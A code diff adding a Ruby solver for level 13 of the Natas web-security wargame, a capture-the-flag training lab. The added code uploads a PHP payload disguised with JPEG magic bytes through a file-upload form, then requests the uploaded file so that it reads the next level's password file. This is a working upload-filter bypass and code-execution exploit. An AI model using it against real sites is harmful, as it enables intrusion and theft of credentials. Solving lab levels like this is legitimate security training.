@@ -420,4 +420,29 @@ end
 # Level 13
 class NatasLevel13 < NatasLevelBase
   LEVEL = 13
+  PAGE = '/'
+  PAYLOAD = %[\xff\xd8\xff<? echo(file_get_contents('#{WEBPASS}/natas14')); ?>]
+
+  def exec
+    data = [
+      ['filename', 'file.php'],
+      ['uploadedfile', PAYLOAD, { filename: 'uploadedfile' }]
+    ]
+    log('Uploading file')
+    data = post(PAGE, {}, data, multipart: true).body
+    match = %r{The file <a href="(upload/\w+.php)">}.match(data)
+    not_found unless match
+    file = "/#{match[1]}"
+    log("Getting file #{file}")
+    data = get(file).body
+    match = /(\w{32})/.match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+##
+# Level 14
+class NatasLevel14 < NatasLevelBase
+  LEVEL = 14
 end
